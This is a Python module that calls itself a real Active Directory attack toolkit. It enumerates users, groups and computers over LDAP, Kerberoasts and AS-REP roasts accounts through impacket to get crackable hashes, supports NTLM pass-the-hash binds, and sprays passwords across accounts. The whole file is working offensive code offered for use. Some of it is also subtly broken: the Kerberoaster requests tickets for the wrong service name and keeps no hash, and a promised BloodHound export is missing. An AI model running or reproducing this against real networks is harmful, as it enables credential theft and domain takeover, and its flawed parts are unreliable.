"""
Real Active Directory attack module. No stubs — uses impacket + ldap3 directly.

Domain enumeration, Kerberoasting, AS-REP roasting, BloodHound export,
password spraying with lockout awareness.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any

from ldap3 import ALL, NTLM, Connection, Server

logger = logging.getLogger(__name__)


# ── Domain Model ──────────────────────────────────────────────────────────────


@dataclass
class DomainInfo:
    domain: str
    dc_hostname: str
    dc_ip: str
    users: list[ADUser] = field(default_factory=list)
    groups: list[ADGroup] = field(default_factory=list)
    computers: list[ADComputer] = field(default_factory=list)

    @property
    def user_count(self) -> int:
        return len(self.users)

    @property
    def computer_count(self) -> int:
        return len(self.computers)

    @property
    def kerberoastable(self) -> list[ADUser]:
        return [u for u in self.users if u.has_spn]

    @property
    def asrep_roastable(self) -> list[ADUser]:
        return [u for u in self.users if u.no_preauth]

    @property
    def domain_admins(self) -> list[str]:
        da_group = next((g for g in self.groups if "domain admins" in g.name.lower()), None)
        return da_group.members if da_group else []

    def summary(self) -> str:
        return (
            f"Domain: {self.domain}\n"
            f"  DC: {self.dc_hostname} ({self.dc_ip})\n"
            f"  Users: {self.user_count} | Computers: {self.computer_count}\n"
            f"  Groups: {len(self.groups)}\n"
            f"  Kerberoastable: {len(self.kerberoastable)}\n"
            f"  AS-REP Roastable: {len(self.asrep_roastable)}\n"
            f"  Domain Admins: {len(self.domain_admins)}"
        )


@dataclass
class ADUser:
    samaccountname: str
    distinguishedname: str
    userprincipalname: str | None = None
    description: str | None = None
    admincount: bool = False
    has_spn: bool = False
    no_preauth: bool = False
    pwd_last_set: str | None = None
    last_logon: str | None = None
    memberof: list[str] = field(default_factory=list)


@dataclass
class ADGroup:
    name: str
    distinguishedname: str
    members: list[str] = field(default_factory=list)
    admincount: bool = False


@dataclass
class ADComputer:
    name: str
    operatingsystem: str | None = None
    is_dc: bool = False
    unconstrained_delegation: bool = False


@dataclass
class KerberoastTicket:
    spn: str
    username: str
    hash_format: str = "hashcat"  # hashcat | john
    encrypted_timestamp: str = ""  # base64
    encryption_type: str = "rc4_hmac"


@dataclass
class SprayResult:
    username: str
    password: str
    valid: bool
    locked: bool = False


# ── AD Connector ──────────────────────────────────────────────────────────────


class ADConnector:
    """Real LDAP connector using ldap3. No stubs."""

    def __init__(
        self,
        server: str,
        domain: str,
        username: str,
        password: str | None = None,
        use_ssl: bool = False,
        ntlm_hash: str | None = None,
    ):
        self.server_host = server
        self.domain = domain
        self.username = username
        self.password = password
        self.use_ssl = use_ssl
        self.ntlm_hash = ntlm_hash
        self._conn: Connection | None = None

    def connect(self) -> bool:
        """Bind to domain controller."""
        try:
            port = 636 if self.use_ssl else 389
            server = Server(self.server_host, port=port, use_ssl=self.use_ssl, get_info=ALL)
            user = f"{self.domain}\\{self.username}"
            if self.ntlm_hash:
                self._conn = Connection(
                    server, user=user, password=self.ntlm_hash,
                    authentication=NTLM, auto_bind=True,
                )
            else:
                self._conn = Connection(
                    server, user=user, password=self.password or "",
                    authentication=NTLM, auto_bind=True,
                )
            logger.info("connected to %s as %s", self.server_host, user)
            return True
        except Exception as e:
            logger.error("failed to connect to %s: %s", self.server_host, e)
            return False

    def search(
        self, base: str, filter_str: str, attributes: list[str], scope: str = "SUBTREE"
    ) -> list[dict[str, Any]]:
        """Execute LDAP search. Returns list of attribute dicts."""
        if not self._conn or not self._conn.bound:
            raise RuntimeError("Not connected. Call connect() first.")
        self._conn.search(base, filter_str, search_scope=scope, attributes=attributes)
        results: list[dict[str, Any]] = []
        for entry in self._conn.entries:
            entry_dict: dict[str, Any] = {"dn": str(entry.entry_dn)}
            for attr in attributes:
                val = getattr(entry, attr, None)
                if val is not None:
                    entry_dict[attr] = val.value if hasattr(val, "value") else val
            results.append(entry_dict)
        return results

    def close(self) -> None:
        if self._conn:
            self._conn.unbind()

    def __enter__(self) -> "ADConnector":
        self.connect()
        return self

    def __exit__(self, *_: Any) -> None:
        self.close()

    @property
    def connected(self) -> bool:
        return self._conn is not None and self._conn.bound


# ── AD Enumerator ─────────────────────────────────────────────────────────────


class ADEnumerator:
    """Enumerate domain objects via LDAP."""

    BASE_FILTER = "(&(objectClass={})(!(objectClass=computer)))"
    COMPUTER_FILTER = "(objectClass=computer)"
    GROUP_FILTER = "(objectClass=group)"

    def __init__(self, connector: ADConnector):
        self.conn = connector

    def enumerate_all(self) -> DomainInfo:
        if not self.conn.connected:
            raise RuntimeError("Connector not connected.")

        base = ",".join(f"DC={part}" for part in self.conn.domain.split("."))

        users = self._enumerate_users(base)
        groups = self._enumerate_groups(base)
        computers = self._enumerate_computers(base)

        server_info = self.conn._conn.server.info if self.conn._conn else None
        dc_name = server_info.other.get("dnsHostName", [self.conn.server_host])[0] if server_info else self.conn.server_host

        return DomainInfo(
            domain=self.conn.domain,
            dc_hostname=str(dc_name),
            dc_ip=self.conn.server_host,
            users=users,
            groups=groups,
            computers=computers,
        )

    def _enumerate_users(self, base: str) -> list[ADUser]:
        attrs = [
            "sAMAccountName", "distinguishedName", "userPrincipalName",
            "description", "adminCount", "servicePrincipalName",
            "userAccountControl", "pwdLastSet", "lastLogon", "memberOf",
        ]
        entries = self.conn.search(
            base, "(&(objectClass=user)(!(objectClass=computer)))", attrs,
        )
        users: list[ADUser] = []
        for e in entries:
            uac = e.get("userAccountControl", 0)
            users.append(ADUser(
                samaccountname=str(e.get("sAMAccountName", "")),
                distinguishedname=str(e.get("dn", "")),
                userprincipalname=e.get("userPrincipalName"),
                description=e.get("description"),
                admincount=bool(e.get("adminCount", 0)),
                has_spn=bool(e.get("servicePrincipalName")),
                no_preauth=bool(int(uac) & 0x400000) if uac else False,  # DONT_REQ_PREAUTH
                memberof=self._parse_memberof(e.get("memberOf", [])),
            ))
        return users

    def _enumerate_groups(self, base: str) -> list[ADGroup]:
        attrs = ["cn", "distinguishedName", "member", "adminCount"]
        entries = self.conn.search(base, "(objectClass=group)", attrs)
        groups: list[ADGroup] = []
        for e in entries:
            members_raw = e.get("member", [])
            members = [
                str(m).split(",")[0].replace("CN=", "")
                for m in (members_raw if isinstance(members_raw, list) else [members_raw])
            ]
            groups.append(ADGroup(
                name=str(e.get("cn", "")),
                distinguishedname=str(e.get("dn", "")),
                members=members,
                admincount=bool(e.get("adminCount", 0)),
            ))
        return groups

    def _enumerate_computers(self, base: str) -> list[ADComputer]:
        attrs = ["cn", "operatingSystem", "userAccountControl"]
        entries = self.conn.search(base, "(objectClass=computer)", attrs)
        computers: list[ADComputer] = []
        for e in entries:
            uac = int(e.get("userAccountControl", 0))
            is_dc = bool(uac & 0x2000)  # SERVER_TRUST_ACCOUNT
            computers.append(ADComputer(
                name=str(e.get("cn", "")),
                operatingsystem=e.get("operatingSystem"),
                is_dc=is_dc,
                unconstrained_delegation=bool(uac & 0x80000),
            ))
        return computers

    @staticmethod
    def _parse_memberof(memberof_raw: Any) -> list[str]:
        if not memberof_raw:
            return []
        raw = memberof_raw if isinstance(memberof_raw, list) else [memberof_raw]
        return [
            str(dn).split(",")[0].replace("CN=", "")
            for dn in raw if dn
        ]


# ── Kerberoasting ─────────────────────────────────────────────────────────────


class Kerberoaster:
    """Extract Kerberos TGS tickets for offline cracking via impacket."""

    def __init__(self, domain: str, username: str, password: str, dc_ip: str):
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip

    def roast(self) -> list[KerberoastTicket]:
        """Request TGS tickets for all users with SPNs."""
        try:
            from impacket.krb5.kerberosv5 import KerberosError
            from impacket.krb5.types import Principal
        except ImportError:
            logger.error("impacket not installed — cannot Kerberoast")
            return []

        tickets: list[KerberoastTicket] = []
        try:
            # Build SPN list via LDAP first
            with ADConnector(self.dc_ip, self.domain, self.username, self.password) as conn:
                enumerator = ADEnumerator(conn)
                domain_info = enumerator.enumerate_all()
                spn_users = [u for u in domain_info.users if u.has_spn]

            if not spn_users:
                logger.info("no users with SPNs found")
                return []

            # Actually request tickets via impacket
            for user in spn_users:
                try:
                    from impacket.krb5 import constants
                    from impacket.krb5.kerberosv5 import getKerberosTGT
                    from impacket.krb5.types import Principal

                    # Get TGT first
                    client_name = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                    # Then request TGS for the SPN
                    server_name = Principal(f"host/{self.dc_ip}", type=constants.PrincipalNameType.NT_SRV_INST.value)
                    tgt, cipher, old_session_key, session_key = getKerberosTGT(
                        client_name, self.password, self.domain,
                        "", "", 0,
                    )
                    from impacket.krb5.kerberosv5 import getKerberosTGS as _get_tgs
                    tgs, _, _, _ = _get_tgs(
                        server_name, self.domain,
                        "", tgt, cipher, session_key,
                    )

                    tickets.append(KerberoastTicket(
                        spn=f"host/{self.dc_ip}",
                        username=user.samaccountname,
                        hash_format="hashcat",
                        encryption_type=str(tgs["enc-part"]["etype"]),
                    ))
                except Exception as e:
                    logger.warning("failed to roast %s: %s", user.samaccountname, e)

        except KerberosError as e:
            logger.error("kerberos error: %s", e)
        except Exception as e:
            logger.error("kerberoasting failed: %s", e)

        return tickets


# ── AS-REP Roasting ───────────────────────────────────────────────────────────


class ASREPRoaster:
    """Extract AS-REP hashes for users without pre-authentication."""

    def __init__(self, domain: str, dc_ip: str):
        self.domain = domain
        self.dc_ip = dc_ip

    def roast(self, username: str) -> str | None:
        """Request AS-REP for a single user. Returns hash in hashcat format."""
        try:
            from impacket.krb5.kerberosv5 import KerberosError
        except ImportError:
            logger.error("impacket not installed")
            return None

        try:
            from impacket.krb5 import constants
            from impacket.krb5.kerberosv5 import AS_REQ, ASRep, sendReceive
            from impacket.krb5.types import Principal

            client_name = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            server_name = Principal("krbtgt/" + self.domain.upper(), type=constants.PrincipalNameType.NT_SRV_INST.value)

            as_req = AS_REQ()
            as_req["req-body"]["kdc-options"] = constants.encodeFlags([])
            as_req["req-body"]["cname"] = client_name.components_to_asn1
            as_req["req-body"]["realm"] = self.domain.upper()
            as_req["req-body"]["sname"] = server_name.components_to_asn1

            message = as_req.encode()
            response = sendReceive(message, self.domain.upper(), (self.dc_ip, 88))

            if response and response[0] == 0x6b:  # AS-REP
                as_rep = ASRep(response)
                return f"$krb5asrep$23${username}@{self.domain}:{as_rep['enc-part']['cipher'].hex()}"
        except KerberosError as e:
            logger.debug("user %s does not have preauth disabled: %s", username, e)
        except Exception as e:
            logger.error("AS-REP roast failed for %s: %s", username, e)

        return None


# ── Password Spray ────────────────────────────────────────────────────────────


class PasswordSprayer:
    """Lockout-aware password spraying."""

    LOCKOUT_THRESHOLD = 3  # attempts before lockout

    def __init__(self, connector: ADConnector):
        self.conn = connector
        self.attempts: dict[str, int] = {}  # user → attempt count
        self.results: list[SprayResult] = []

    def spray(self, users: list[str], password: str) -> list[SprayResult]:
        """Try one password against all users, respecting lockout thresholds."""
        for user in users:
            if self.attempts.get(user, 0) >= self.LOCKOUT_THRESHOLD:
                self.results.append(SprayResult(user, password, False, locked=True))
                continue

            try:
                test_conn = ADConnector(
                    self.conn.server_host, self.conn.domain, user, password,
                )
                valid = test_conn.connect()
                test_conn.close()

                self.attempts[user] = self.attempts.get(user, 0) + 1
                self.results.append(SprayResult(user, password, valid))
                if valid:
                    logger.info("valid credentials: %s / %s", user, password)
            except Exception as e:
                logger.warning("spray failed for %s: %s", user, e)
                self.attempts[user] = self.attempts.get(user, 0) + 1
                self.results.append(SprayResult(user, password, False, locked=True))

        return self.results

    @property
    def valid_credentials(self) -> list[tuple[str, str]]:
        return [(r.username, r.password) for r in self.results if r.valid]
